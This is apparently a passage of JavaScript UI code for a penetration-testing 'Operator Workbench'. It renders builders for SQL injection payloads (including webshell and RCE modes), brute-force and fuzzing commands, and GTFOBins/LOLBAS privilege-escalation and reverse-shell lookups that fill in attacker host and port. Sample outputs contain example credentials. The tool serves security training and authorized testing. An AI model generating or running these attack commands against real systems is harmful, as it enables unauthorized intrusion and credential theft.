            + '</div>';
        }).join('')
      + '</div>';
  }

  function sqliPanel() {
    var dbmsList = W.sqliDbmsList();
    var modes = [
      { id: 'union',  label: '1. Progressive UNION Builder' },
      { id: 'bypass', label: '2. Auth Bypass & Login Probes' },
      { id: 'blind',  label: '3. Error-Based & Blind Extraction' },
      { id: 'rce',    label: '4. File Read, Webshell & RCE' },
    ];
    return '<div class="wb-panel wb-panel-violet">'
      + '<div class="wb-panel-head"><div>'
      + '<h2 class="wb-panel-title">' + (OBOL.ic ? OBOL.ic('database') : '') + 'Manual SQL Injection Payload Builder (Exam-Legal)</h2>'
      + '<p class="wb-panel-sub">Select the database engine and attack mode. In UNION mode, click your discovered column count and visible column to generate table and credential dump queries.</p>'
      + '</div></div>'
      + '<div class="wb-field-l" style="margin-top:0">Database Engine</div>'
      + '<div class="wb-rs-opts">'
      + dbmsList.map(function (d) {
          var on = d.id === state.sqliDbms;
          return '<button type="button" class="wb-rs-opt' + (on ? ' on' : '') + '" data-wb-dbms="' + d.id + '">' + esc(d.name) + '</button>';
        }).join('')
      + '</div>'
      + '<div class="wb-subtabs" style="margin-top:14px">'
      + modes.map(function (m) {
          var on = m.id === state.sqliMode;
          return '<button type="button" class="wb-subtab' + (on ? ' on' : '') + '" data-wb-sqlimode="' + m.id + '">' + esc(m.label) + '</button>';
        }).join('')
      + '</div>'
      + (state.sqliMode === 'union'
          ? '<div class="wb-params" style="margin-top:12px">'
            + '<div class="wb-param"><span>Parameter Context</span><div class="wb-enc-row">'
            + '<button type="button" class="wb-chip' + (state.sqliCtx === 'string' ? ' on' : '') + '" data-wb-sqlictx="string">String (\'...\')</button>'
            + '<button type="button" class="wb-chip' + (state.sqliCtx === 'numeric' ? ' on' : '') + '" data-wb-sqlictx="numeric">Numeric</button>'
            + '</div></div>'
            + '<label class="wb-param"><span>Column Count (Step 2)</span>'
            + '<input id="wb-sqli-cols" type="number" min="0" max="20" value="' + (state.sqliCols || '') + '" placeholder="e.g. 4"></label>'
            + '<label class="wb-param"><span>Visible Column (Step 3)</span>'
            + '<input id="wb-sqli-vis" type="number" min="0" max="20" value="' + (state.sqliVis || '') + '" placeholder="e.g. 2"></label>'
            + '<label class="wb-param"><span>Target Table Name (Step 5)</span>'
            + '<input id="wb-sqli-tbl" type="text" value="' + esc(state.sqliTable) + '" placeholder="users" autocomplete="off" spellcheck="false"></label>'
            + '</div>'
          : '')
      + '<div id="wb-sqli-out">' + renderSqliOut() + '</div>'
      + '</div>';
  }

  // ── 9. Wordlists & Fuzzing Command Builder ──────────────────────────────────────────────────
  function detectedStackTags() {
    var tags = [];
    try {
      var fs = OBOL.store && OBOL.store.factSet ? OBOL.store.factSet() : null;
      if (!fs || !fs.facts) return tags;
      fs.facts.forEach(function (f) {
        if (!f || !f.kind) return;
        var s = JSON.stringify(f.value || '').toLowerCase();
        ['iis', 'apache', 'nginx', 'wordpress', 'php', 'aspnet', 'windows', 'linux', 'api'].forEach(function (k) {
          if (s.indexOf(k) >= 0 && tags.indexOf(k) < 0) tags.push(k);
        });
      });
    } catch (e) {}
    return tags;
  }

  function toolsForWordlistTask(task) {
    if (task === 'users') {
      return [
        { id: 'nxc',      label: 'NetExec SMB (User List)' },
        { id: 'kerbrute', label: 'kerbrute userenum (AD)' },
        { id: 'hydra',    label: 'hydra (SSH User List)' },
        { id: 'ffuf',     label: 'ffuf (Web Username Fuzz)' },
      ];
    }
    if (task === 'passwords') {
      return [
        { id: 'hashcat',  label: 'hashcat (Offline Crack)' },
        { id: 'john',     label: 'john (Offline Crack)' },
        { id: 'nxc',      label: 'NetExec SMB (Password Brute)' },
        { id: 'hydra',    label: 'hydra (SSH Brute)' },
        { id: 'ffuf',     label: 'ffuf (Web Login Brute)' },
      ];
    }
    if (task === 'subdomains') {
      return [
        { id: 'ffuf',     label: 'ffuf (Host Header VHost)' },
        { id: 'gobuster', label: 'gobuster vhost' },
        { id: 'wfuzz',    label: 'wfuzz (Host Header)' },
      ];
    }
    if (task === 'lfi') {
      return [
        { id: 'ffuf',        label: 'ffuf (LFI Parameter Fuzz)' },
        { id: 'wfuzz',       label: 'wfuzz (LFI Traversal)' },
        { id: 'feroxbuster', label: 'feroxbuster' },
      ];
    }
    if (task === 'params') {
      return [
        { id: 'ffuf',  label: 'ffuf (Query Parameter Fuzz)' },
        { id: 'arjun', label: 'arjun (HTTP Parameter Discovery)' },
        { id: 'wfuzz', label: 'wfuzz (Parameter Fuzz)' },
      ];
    }
    return [
      { id: 'ffuf',        label: 'ffuf (Fast & Flexible)' },
      { id: 'feroxbuster', label: 'feroxbuster (Recursive)' },
      { id: 'gobuster',    label: 'gobuster (Classic)' },
      { id: 'dirsearch',   label: 'dirsearch' },
    ];
  }

  function renderWordlistItems() {
    var p = engParams();
    var stack = detectedStackTags();
    var list = W.pickWordlists(state.wlTask, stack);
    return '<div class="wb-wl-list">'
      + list.map(function (w, i) {
          var badge = w.matched ? '<span class="wb-likely">Matches Detected Stack</span>' : (i === 0 ? '<span class="wb-likely">Start Here</span>' : '');
          var cmd = W.fuzzCmd
            ? W.fuzzCmd({ task: w.task, tool: state.wlTool, path: w.path, target: p.target, domain: p.domain, user: p.user, ext: state.wlExt })
            : W.wordlistCmd(w.task, w.path, p.target, state.wlExt);
          return '<div class="wb-wl-card' + (i === 0 ? ' top' : '') + '">'
            + '<div class="wb-wl-head">' + badge + '<span class="wb-wl-name">' + esc(w.name) + '</span></div>'
            + '<p class="wb-hash-note">' + esc(w.note) + '</p>'
            + cmdRow(w.path, '', '', { locus: 'path' })
            + cmdRow(cmd, '', 'wb-cmd-listener', { locus: 'kali$' })
            + '</div>';
        }).join('')
      + '</div>';
  }

  function wordlistsPanel() {
    var p = engParams();
    var extPresets = [
      { label: 'No Extension', val: '' },
      { label: 'PHP (.php,txt,bak)', val: 'php,txt,bak' },
      { label: 'IIS / ASP.NET (.aspx,ashx,config)', val: 'aspx,ashx,config,bak' },
      { label: 'Java / Tomcat (.jsp,war,do)', val: 'jsp,war,do' },
      { label: 'Backups & Env (.bak,old,sql,zip,env)', val: 'bak,old,sql,zip,env' },
    ];
    var tools = toolsForWordlistTask(state.wlTask);
    if (!tools.some(function (t) { return t.id === state.wlTool; })) {
      state.wlTool = tools[0].id;
    }
    var showExt = state.wlTask === 'dirs' || state.wlTask === 'files' || state.wlTask === 'api';
    return '<div class="wb-panel wb-panel-violet">'
      + '<div class="wb-panel-head"><div>'
      + '<h2 class="wb-panel-title">' + (OBOL.ic ? OBOL.ic('list') : '') + 'Wordlist Picker &amp; Fuzzing Command Builder</h2>'
      + '<p class="wb-panel-sub">Select what you are fuzzing or enumerating, pick your tool, and copy a clean, comment-free command ready to paste directly into your terminal.</p>'
      + '</div></div>'
      + '<div class="wb-field-l" style="margin-top:0">1. What Are You Enumerating / Fuzzing?</div>'
      + '<div class="wb-rs-opts">'
      + W.WORDLIST_TASKS.map(function (t) {
          var on = t.id === state.wlTask;
          return '<button type="button" class="wb-rs-opt' + (on ? ' on' : '') + '" data-wb-wltask="' + t.id + '">' + esc(t.label) + '</button>';
        }).join('')
      + '</div>'
      + '<div class="wb-paired-grid" style="margin-top:12px">'
      + '<div><div class="wb-field-l" style="margin-top:0">2. Command Tool</div><div class="wb-enc-row">'
      + tools.map(function (tl) {
          var on = tl.id === state.wlTool;
          return '<button type="button" class="wb-chip' + (on ? ' on' : '') + '" data-wb-wltool="' + tl.id + '">' + esc(tl.label) + '</button>';
        }).join('')
      + '</div></div>'
      + (showExt
          ? '<div><div class="wb-field-l" style="margin-top:0">3. File Extensions (Optional)</div><div class="wb-fill-chips" style="margin-bottom:6px">'
            + extPresets.map(function (ep) {
                var on = state.wlExt === ep.val;
                return '<button type="button" class="wb-fill-chip' + (on ? ' on' : '') + '" data-wb-wlext="' + esc(ep.val) + '">' + esc(ep.label) + '</button>';
              }).join('')
            + '</div></div>'
          : '')
      + '</div>'
      + '<div id="wb-wl-out" class="wb-wl-out">' + renderWordlistItems() + '</div>'
      + '<details class="wb-extractor-drawer" style="margin-top:18px">'
      + '<summary class="wb-extractor-sum">Custom Target Wordlist Generators (CeWL, Hashcat Rules, Username-Anarchy)</summary>'
      + '<div class="wb-step-list" style="margin-top:10px">'
      + (W.CUSTOM_WORDLIST_CMDS || []).map(function (c) {
          var filled = String(c.cmd).replace(/\{\{target\}\}/g, p.target);
          return '<div class="wb-step-card wb-card-violet"><div class="wb-xform-l">' + esc(c.label) + '</div>' + cmdRow(filled, '', '', { locus: c.locus }) + '</div>';
        }).join('')
      + '</div></details>'
      + '</div>';
  }

  // ── 10. GTFOBins + Windows LOLBAS Escape Browser ────────────────────────────────────────────
  var GTFO_SUGGESTIONS = ['find', 'vim', 'python', 'bash', 'less', 'awk', 'perl', 'tar', 'nmap', 'openssl', 'env', 'cp', 'php', 'rvim', 'certutil.exe', 'powershell.exe', 'rundll32.exe', 'msiexec.exe', 'cmdkey.exe', 'runas.exe', 'vssadmin.exe', 'robocopy.exe'];
  var GTFO_FN_LABELS = { 'sudo': 'Sudo', 'suid': 'SUID', 'limited-suid': 'Limited SUID', 'capabilities': 'Capabilities', 'shell': 'Shell', 'command': 'Command', 'file-read': 'File Read', 'file-write': 'File Write', 'file-upload': 'File Upload', 'file-download': 'File Download', 'reverse-shell': 'Reverse Shell', 'non-interactive-reverse-shell': 'Reverse Shell (non-interactive)', 'bind-shell': 'Bind Shell', 'library-load': 'Library Load' };

  function discoveredTargetBins() {
    var out = [];
    try {
      var fs = OBOL.store && OBOL.store.factSet ? OBOL.store.factSet() : null;
      if (!fs || !fs.facts) return out;
      fs.facts.forEach(function (f) {
        if (!f || !f.kind) return;
        var v = f.value || {};
        if (f.kind === 'privesc.sudo_binary' && v.bin) out.push(String(v.bin).split('/').pop());
        if (f.kind === 'privesc.suid_candidate' && Array.isArray(v.paths)) {
          v.paths.forEach(function (p) { out.push(String(p).split('/').pop()); });
        }
      });
    } catch (e) {}
    return out.filter(function (b, i, a) { return b && a.indexOf(b) === i; });
  }

  function renderGtfoResults(query) {
    var p = engParams();
    var db = OBOL.gtfobins || {};
    var lolbas = W.LOLBAS || [];
    var q = String(query == null ? '' : query).trim().toLowerCase().replace(/^.*\//, '');
    var plat = state.gtfoPlatform || 'all';
    var cap = state.gtfoCap || 'all';

    // Check Windows LOLBAS match
    var lolHit = null;
    if (plat !== 'linux' && q) {
      lolHit = lolbas.filter(function (x) { return x.bin.toLowerCase() === q || x.bin.toLowerCase().replace(/\.exe$/, '') === q; })[0];
    }

    if (lolHit) {
      return '<div class="wb-gtfo-hit">'
        + '<div class="wb-gtfo-head"><span class="wb-badge wb-badge-cyan">Windows LOLBAS</span><span class="wb-gtfo-bin">' + esc(lolHit.bin) + '</span>'
        + '<a class="wb-gtfo-link" href="' + esc(lolHit.url) + '" target="_blank" rel="noopener noreferrer">lolbas-project.github.io &#8599;</a></div>'
        + Object.keys(lolHit.fns).map(function (fnKey) {
            return '<div class="wb-gtfo-fn"><div class="wb-field-l">' + esc(fnKey) + '</div>'
              + lolHit.fns[fnKey].map(function (item) {
                  var filled = String(item.code || '').replace(/\{\{lhost\}\}/g, p.lhost).replace(/\{\{lport\}\}/g, p.lport).replace(/\{\{target\}\}/g, p.target);
                  return (item.description ? '<p class="wb-hash-note">' + esc(item.description) + '</p>' : '')
                    + cmdRow(filled, '', '', { locus: 'C:\\>' });
                }).join('')
              + '</div>';
          }).join('')
        + '</div>';
    }

    // Check Linux GTFOBins exact match
    var hit = (plat !== 'windows' && q) ? (db[q] || db[q.replace(/\d+(\.\d+)*$/, '')]) : null;
    var hitName = hit ? (db[q] ? q : q.replace(/\d+(\.\d+)*$/, '')) : null;
    if (hit) {
      var order = ['sudo', 'suid', 'limited-suid', 'capabilities', 'shell', 'command', 'file-read', 'file-write', 'reverse-shell', 'non-interactive-reverse-shell', 'bind-shell', 'file-upload', 'file-download', 'library-load'];
      var fns = Object.keys(hit).sort(function (a, b) { return (order.indexOf(a) < 0 ? 99 : order.indexOf(a)) - (order.indexOf(b) < 0 ? 99 : order.indexOf(b)); });
      if (cap !== 'all') {
        fns = fns.filter(function (fn) { return fn.indexOf(cap) >= 0; });
      }
      return '<div class="wb-gtfo-hit">'
        + '<div class="wb-gtfo-head"><span class="wb-badge wb-badge-emerald">Linux GTFOBins</span><span class="wb-gtfo-bin">' + esc(hitName) + '</span>'
        + '<a class="wb-gtfo-link" href="https://gtfobins.github.io/gtfobins/' + encodeURIComponent(hitName) + '/" target="_blank" rel="noopener noreferrer">gtfobins.github.io/' + esc(hitName) + ' &#8599;</a></div>'
        + fns.map(function (fn) {
            var items = hit[fn] || [];
            return '<div class="wb-gtfo-fn"><div class="wb-field-l">' + esc(GTFO_FN_LABELS[fn] || fn) + '</div>'
              + items.map(function (it) {
                  return (it.description ? '<p class="wb-hash-note">' + esc(it.description) + '</p>' : '')
                    + cmdRow(it.code, '', '', { locus: 'target$' });
                }).join('')
              + '</div>';
          }).join('')
        + '</div>';
    }

    // Otherwise filter binary chips by platform + capability + substring
    var linuxMatches = plat === 'windows' ? [] : Object.keys(db).filter(function (k) {
      if (q && k.indexOf(q) < 0) return false;
      if (cap !== 'all') {
        return Object.keys(db[k] || {}).some(function (fn) { return fn.indexOf(cap) >= 0; });
      }
      return !q ? GTFO_SUGGESTIONS.indexOf(k) >= 0 : true;
    }).slice(0, 32);

    var winMatches = plat === 'linux' ? [] : lolbas.filter(function (x) {
      if (q && x.bin.toLowerCase().indexOf(q) < 0) return false;
      return true;
    });

    return '<div class="wb-gtfo-browse">'
      + (linuxMatches.length
          ? '<div class="wb-field-l">Linux GTFOBins (' + linuxMatches.length + ' shown - click to inspect)</div>'
            + '<div class="wb-rs-opts">' + linuxMatches.map(function (n) {
                return '<button type="button" class="wb-gtfo-sug" data-wb-gtfo="' + esc(n) + '">' + esc(n) + '</button>';
              }).join('') + '</div>'
          : '')
      + (winMatches.length
          ? '<div class="wb-field-l" style="margin-top:14px">Windows LOLBAS (' + winMatches.length + ' binaries - click to inspect)</div>'
            + '<div class="wb-rs-opts">' + winMatches.map(function (x) {
                return '<button type="button" class="wb-gtfo-sug wb-gtfo-win" data-wb-gtfo="' + esc(x.bin) + '">' + esc(x.bin) + '</button>';
              }).join('') + '</div>'
          : '')
      + '</div>';
  }

  function gtfoPanel() {
    var targetBins = discoveredTargetBins();
    var caps = [
      { id: 'all',       label: 'All Capabilities' },
      { id: 'sudo',      label: 'Sudo' },
      { id: 'suid',      label: 'SUID' },
      { id: 'capabilities', label: 'Capabilities' },
      { id: 'shell',     label: 'Shell' },
      { id: 'file-read', label: 'File Read' },
      { id: 'file-write',label: 'File Write' },
    ];
    return '<div class="wb-panel wb-panel-emerald">'
      + '<div class="wb-panel-head"><div>'
      + '<h2 class="wb-panel-title">' + (OBOL.ic ? OBOL.ic('zap') : '') + 'GTFOBins (Linux) &amp; LOLBAS (Windows) Escape Browser</h2>'
      + '<p class="wb-panel-sub">Look up exact privilege-escalation, file-read, and download/execution primitives for Linux SUID/Sudo binaries and built-in Windows executables.</p>'
      + '</div></div>'
      + (targetBins.length
          ? '<div class="wb-clean" style="margin-bottom:14px"><div class="wb-clean-h">Discovered on Active Target (Click to Inspect)</div><div class="wb-fill-chips" style="margin:6px 0 0">'
            + targetBins.map(function (b) { return '<button type="button" class="wb-fill-chip" data-wb-gtfo="' + esc(b) + '">' + esc(b) + '</button>'; }).join('')
            + '</div></div>'
          : '')
      + '<div class="wb-paired-grid" style="margin-bottom:12px">'
      + '<div><div class="wb-field-l" style="margin-top:0">Platform</div><div class="wb-enc-row">'
      + ['all', 'linux', 'windows'].map(function (pl) {
          var on = state.gtfoPlatform === pl;
          var lbl = pl === 'all' ? 'All (Linux + Windows)' : (pl === 'linux' ? 'Linux (GTFOBins)' : 'Windows (LOLBAS)');
          return '<button type="button" class="wb-chip' + (on ? ' on' : '') + '" data-wb-gtfoplat="' + pl + '">' + esc(lbl) + '</button>';
        }).join('')
      + '</div></div>'
      + '<div><div class="wb-field-l" style="margin-top:0">Filter by Capability</div><div class="wb-enc-row">'
      + caps.map(function (c) {
          var on = state.gtfoCap === c.id;
          return '<button type="button" class="wb-chip' + (on ? ' on' : '') + '" data-wb-gtfocap="' + c.id + '">' + esc(c.label) + '</button>';
        }).join('')
      + '</div></div></div>'
      + '<label class="wb-field-l" for="wb-gtfo-in">Search Binary Name (or Full Path like /usr/bin/python3)</label>'
      + '<input id="wb-gtfo-in" class="wb-input" type="text" value="' + esc(state.gtfoQuery) + '" placeholder="find, vim, python3, certutil.exe, rundll32.exe..." autocomplete="off" spellcheck="false">'
      + '<div id="wb-gtfo-out" class="wb-gtfo-out">' + renderGtfoResults(state.gtfoQuery) + '</div>'
      + '</div>';
  }

  // ── 11. Upgraded Output & Error Doctor ──────────────────────────────────────────────────────
  var DOCTOR_SAMPLES = [
    {
      label: 'Error: Kerberos Clock Skew & SPN',
      val: 'impacket-GetUserSPNs acme.internal/bob:Autumn2026! -dc-ip 10.10.10.10 -request\n[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\n[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)'
    },
    {
      label: 'Dead End: Stock Linux SUID Scan',
      val: '/usr/bin/passwd\n/usr/bin/su\n/usr/bin/sudo\n/usr/bin/mount\n/usr/bin/umount\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/lib/openssh/ssh-keysign'
    },
    {
      label: 'Dead End: Standard Windows whoami /priv',
      val: 'PRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                          State\n============================= ==================================== ========\nSeShutdownPrivilege           Shut down the system                 Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking             Enabled\nSeUndockPrivilege             Remove computer from docking station Disabled'
    },
    {
      label: 'Actionable: Internal Port 8080 & SeImpersonate',
      val: 'Proto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled'
    },
    {
      label: 'Actionable: NetExec SMB & Relay Signal',
      val: 'SMB  10.10.10.10  445  DC01  [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:acme.internal) (signing:False) (SMBv1:False) (Null Auth:True)\nSMB  10.10.10.10  445  DC01  [+] acme.internal\\bob:Autumn2026! (Pwn3d!)'
    }
  ];

  function parseForExplain(text) {
    var P = OBOL.parsers;
    if (!P) return [];
    var scope = 'host:' + engParams().target;
    var out = [], seen = {};
    function take(arr) {
      (arr || []).forEach(function (f) {
        if (!f || !f.kind) return;
        var k = f.kind + '|' + JSON.stringify(f.value || {});
        if (!seen[k]) { seen[k] = 1; out.push(f); }
      });
    }
    try { if (P.parseActionOutput) take(P.parseActionOutput('operator-ingest', text, { scope: scope, command: state.explainCmd || '' })); } catch (e) {}
    try { if (P.analyzeTerminal) take((P.analyzeTerminal(text, { scope: scope }) || {}).facts); } catch (e) {}
    return out;
  }

  function renderExplainResults(text) {
    if (!text || !text.trim()) {
      return '<p class="wb-note">Paste any terminal output, error message, or enumeration dump above (or click a sample chip) to run the 4-layer diagnostic: <strong>Error Remedies</strong>, <strong>Benign OS Baseline Verdicts</strong>, <strong>Tactical Line Signals</strong>, and <strong>Minted Facts</strong>.</p>';
    }
    if (!OBOL.parsers) {
      return '<p class="wb-note">Loading parser bundle...</p>';
    }
    var p = engParams();
    var triage = W.triageOutput ? W.triageOutput(text, { command: state.explainCmd, params: p }) : { errors: [], baselines: [], signals: W.scanSignals(text) };
    var facts = parseForExplain(text);
    var ann = W.annotateOutput(text, facts);
    var fs = null;
    try {
      fs = new OBOL.facts.FactSet();
      facts.forEach(function (f) { try { fs.add(f); } catch (e) {} });
    } catch (e) {}
    var domFact = facts.filter(function (f) { return f.kind === 'ad.domain_known' || f.kind === 'host.domain'; })[0];
    var dom = (domFact && domFact.value && (domFact.value.name || domFact.value.domain)) || p.domain;
    var narrs = fs ? W.findingNarratives(fs, { domain: dom }) : [];

    if (!triage.errors.length && !triage.baselines.length && !triage.signals.length && !facts.length) {
      return '<div class="wb-step-card wb-card-slate" style="margin-top:14px">'
        + '<strong>No Errors, Known Baselines, or Attack Facts Matched</strong>'
        + '<p class="wb-hash-note">This output did not trigger an error signature, a default OS dead-end baseline, or an attack fact parser. If it contains an encoded token or hash, inspect it in <a href="#/workbench/codec">Codec &amp; Evasion</a> or <a href="#/workbench/hashid">Hash ID</a>.</p>'
        + '</div>';
    }

    var errSection = triage.errors.length
      ? '<div class="wb-field-l">1. Error Diagnosis &amp; Immediate Remedy (' + triage.errors.length + ')</div><div class="wb-sig-list">'
        + triage.errors.map(function (er) {
            return '<div class="wb-sig wb-sig-warn">'
              + '<div class="wb-sig-label"><span class="wb-badge wb-badge-rose" style="margin-right:8px">Error Detected</span>' + esc(er.title) + '</div>'
              + (er.matchedLine ? '<div class="wb-xform-note" style="margin-bottom:4px">Matched line: <code>' + esc(er.matchedLine) + '</code></div>' : '')
              + '<p class="wb-sig-mean"><strong>Why it failed:</strong> ' + esc(er.why) + '</p>'
              + (er.fixCmd ? '<div class="wb-xform-l" style="margin:6px 0 4px">Corrected Fix Command:</div>' + cmdRow(er.fixCmd, '', '', { locus: 'kali$' }) : '')
              + '</div>';
          }).join('')
        + '</div>'
      : '';

    var baseSection = triage.baselines.length
      ? '<div class="wb-field-l">2. Benign OS Baseline &amp; Dead-End Verdict (' + triage.baselines.length + ')</div><div class="wb-sig-list">'
        + triage.baselines.map(function (bl) {
            return '<div class="wb-sig wb-sig-info">'
              + '<div class="wb-sig-label"><span class="wb-badge wb-badge-emerald" style="margin-right:8px">' + esc(bl.verdict) + '</span>' + esc(bl.title) + '</div>'
              + '<p class="wb-sig-mean">' + esc(bl.detail) + '</p>'
              + '<p class="wb-sig-next"><span class="wb-sig-next-l">Next Move</span>' + esc(bl.next) + '</p>'
              + '</div>';
          }).join('')
        + '</div>'
      : '';

    var sigSection = triage.signals.length
      ? '<div class="wb-field-l">3. Tactical Signals Spotted in Output (' + triage.signals.length + ')</div><div class="wb-sig-list">'
        + triage.signals.map(function (s) {
            return '<div class="wb-sig wb-sig-' + s.tone + '">'
              + '<div class="wb-sig-label">' + esc(s.label) + '</div>'
              + '<p class="wb-sig-mean">' + esc(s.meaning) + '</p>'
              + '<p class="wb-sig-next"><span class="wb-sig-next-l">Next Move</span>' + esc(s.next) + '</p>'
              + '</div>';
          }).join('')
        + '</div>'
      : '';

    var narSection = narrs.length
      ? '<div class="wb-field-l">4. Confirmed Security Findings (' + narrs.length + ')</div><div class="wb-nar-list">'
        + narrs.map(function (n) {
            return '<div class="wb-nar">'
              + '<div class="wb-nar-head">'
              + (n.severity ? '<span class="wb-sev wb-sev-' + esc(n.severity) + '">' + esc(n.severity.toUpperCase()) + '</span>' : '')
              + '<span class="wb-nar-title">' + esc(n.title) + '</span></div>'
              + (n.means ? '<p class="wb-nar-means">' + esc(n.means) + '</p>' : '')
              + (n.impact ? '<p class="wb-nar-impact"><strong>Impact:</strong> ' + esc(n.impact) + '</p>' : '')
              + '</div>';
          }).join('')
        + '</div>'
      : '';

    var factSection = '';
    if (facts.length) {
      var lineRows = ann.lines.map(function (ln, idx) {
        var hit = ln.factIdxs.length > 0;
        var badges = ln.factIdxs.map(function (fi) { return '<span class="wb-ex-badge">#' + (fi + 1) + '</span>'; }).join('');
        return '<div class="wb-ex-line' + (hit ? ' hit' : '') + '" data-line="' + idx + '">'
          + (badges || '<span class="wb-ex-badge" style="opacity:0.25">' + (idx + 1) + '</span>')
          + '<code>' + esc(ln.text) + '</code></div>';
      }).join('');
      var factCards = ann.facts.map(function (af) {
        var f = facts[af.index] || {};
        var ex = W.explainFact ? W.explainFact(f) : af.explain;
        var where = af.lineNos.length
          ? 'Line' + (af.lineNos.length > 1 ? 's ' : ' ') + af.lineNos.map(function (n) { return n + 1; }).join(', ')
          : 'Whole paste';
        return '<div class="wb-ex-fact">'
          + '<div class="wb-ex-fh"><span class="wb-ex-num">#' + (af.index + 1) + '</span>'
          + '<code>' + esc(af.kind) + '</code>'
          + '<span class="wb-ex-from">' + esc(where) + '</span></div>'
          + '<p class="wb-ex-proves"><strong>What this proves:</strong> ' + esc(ex.proves) + '</p>'
          + '<p class="wb-ex-caveat"><strong>What it does NOT prove:</strong> ' + esc(ex.caveat) + '</p>'
          + '</div>';
      }).join('');
      factSection = '<div class="wb-field-l">5. Annotated Output &amp; Minted Engine Facts (' + facts.length + ')</div>'
        + '<div class="wb-ex-src">' + lineRows + '</div>'
        + '<div class="wb-ex-facts">' + factCards + '</div>';
    }

    return '<div class="wb-ex-out">'
      + '<div class="wb-doctor-actions">'
      + '<button type="button" class="wb-go" id="wb-explain-commit">Save &amp; Mint to Active Engagement (' + esc(p.target) + ') &rarr;</button>'
      + '<span class="wb-hint" id="wb-explain-saved"></span>'
      + '</div>'
      + errSection + baseSection + sigSection + narSection + factSection
      + '</div>';
  }

  function explainPanel() {
    return '<div class="wb-panel wb-panel-emerald">'
      + '<div class="wb-panel-head"><div>'
      + '<h2 class="wb-panel-title">' + (OBOL.ic ? OBOL.ic('activity') : '') + 'Output &amp; Error Doctor (Triage Sandbox)</h2>'
      + '<p class="wb-panel-sub">Paste unfamiliar tool errors, enumeration dumps (<code>find</code> SUID, <code>whoami /priv</code>, <code>sudo -l</code>), or scan output. OBOL diagnoses errors with copyable fixes, flags default OS dead ends, and highlights actionable leads.</p>'
      + '</div></div>'
      + '<div class="wb-field-l" style="margin-top:0">Load a Diagnostic Sample</div>'
      + '<div class="wb-fill-chips">'
      + DOCTOR_SAMPLES.map(function (s) {
          return '<button type="button" class="wb-fill-chip" data-wb-exsample="' + U.attr(s.val) + '">' + esc(s.label) + '</button>';
        }).join('')
      + '</div>'
      + '<label class="wb-field-l" for="wb-ex-in">Paste Terminal Output or Error Message</label>'
      + '<textarea id="wb-ex-in" class="wb-textarea" rows="7" placeholder="Paste any terminal output, error message, or enumeration dump..." spellcheck="false">' + esc(state.explainInput) + '</textarea>'
      + '<div style="display:flex;gap:10px;align-items:center;margin-top:10px">'
      + '<button type="button" class="wb-go" id="wb-ex-go" style="margin-top:0">Diagnose &amp; Explain Output</button>'
      + '</div>'
      + '<div id="wb-ex-out">' + renderExplainResults(state.explainInput) + '</div>'
      + '</div>';
  }

  function panelForTab(active) {
    if (active === 'revshell') return revshellPanel();
    if (active === 'transfer') return transferPanel();
    if (active === 'pivot') return pivotPanel();
    if (active === 'hashid') return hashidPanel();
    if (active === 'jwt') return jwtPanel();
    if (active === 'spray') return sprayPanel();
    if (active === 'codec') return codecPanel();
    if (active === 'sqli') return sqliPanel();
    if (active === 'wordlists') return wordlistsPanel();
    if (active === 'gtfobins') return gtfoPanel();
    if (active === 'explain') return explainPanel();
    return revshellPanel();
  }

  // ── Route Shell: Hero + Live Telemetry Context Bar + Spectrum Category Deck ─────────────────
  function render(ctx) {
    var args = (ctx && (ctx.args || ctx.params)) || [];
    var rawTab = args[0] || 'revshell';
    var active = resolveTabId(rawTab);
    if (active === 'wordlists' && args[1]) {
      var subTask = String(args[1]).toLowerCase();
      if (W.WORDLIST_TASKS.some(function (t) { return t.id === subTask; })) state.wlTask = subTask;
    }

    var p = engParams();
    var heroHtml = '<header class="wb-hero">'
      + '<div class="wb-hero-top">'
      + '<div>'
      + '<div class="wb-kicker">' + (OBOL.ic ? OBOL.ic('terminal') : '') + ' OPERATOR WORKBENCH &middot; 11 OFFLINE BUILDERS &amp; DIAGNOSTIC TOOLS</div>'
      + '<h1 class="wb-h1">Workbench</h1>'
      + '<p class="wb-sub">Build reverse shells, stage files, configure pivots, forge JWTs, clean hashes, and diagnose errors. Every command auto-fills from your live engagement telemetry below.</p>'
      + '</div>'
      + (p.engName ? '<div class="wb-eng-badge"><span class="wb-eng-dot"></span>Linked to <strong>' + esc(p.engName) + '</strong></div>' : '')
      + '</div>'
      + '<div class="wb-ctxbar" role="region" aria-label="Live Workbench Telemetry Parameters">'
      + '<label class="wb-ctx-pill wb-ctx-cyan"><span class="wb-ctx-k">TARGET IP</span><input type="text" data-wb-ctx="target" value="' + esc(p.target) + '" spellcheck="false"></label>'
      + '<label class="wb-ctx-pill wb-ctx-violet"><span class="wb-ctx-k">DOMAIN</span><input type="text" data-wb-ctx="domain" value="' + esc(p.domain) + '" spellcheck="false"></label>'
      + '<label class="wb-ctx-pill wb-ctx-emerald"><span class="wb-ctx-k">LHOST (Kali)</span><input type="text" data-wb-ctx="lhost" value="' + esc(p.lhost) + '" spellcheck="false"></label>'
      + '<label class="wb-ctx-pill wb-ctx-amber"><span class="wb-ctx-k">LPORT</span><input type="text" data-wb-ctx="lport" value="' + esc(p.lport) + '" spellcheck="false"></label>'
      + '<label class="wb-ctx-pill wb-ctx-rose"><span class="wb-ctx-k">USER</span><input type="text" data-wb-ctx="user" value="' + esc(p.user) + '" spellcheck="false"></label>'
      + '</div>'
      + '</header>';

    var deckHtml = '<nav class="wb-deck" role="tablist" aria-label="Workbench tool categories">'
      + CATEGORIES.map(function (cat) {
          return '<div class="wb-cat wb-cat-' + cat.color + '">'
            + '<div class="wb-cat-head"><span class="wb-cat-label">' + esc(cat.label) + '</span></div>'
            + '<div class="wb-cat-grid">'
            + cat.tools.map(function (t) {
                var on = t.id === active;
                var ic = OBOL.ic ? OBOL.ic(t.icon) : '';
                return '<a class="wb-tab wb-tool-card wb-tc-' + cat.color + (on ? ' active' : '') + '" href="#/workbench/' + t.id + '" data-wb-tab="' + t.id + '" role="tab" aria-selected="' + (on ? 'true' : 'false') + '">'
                  + '<span class="wb-tc-ic" aria-hidden="true">' + ic + '</span>'
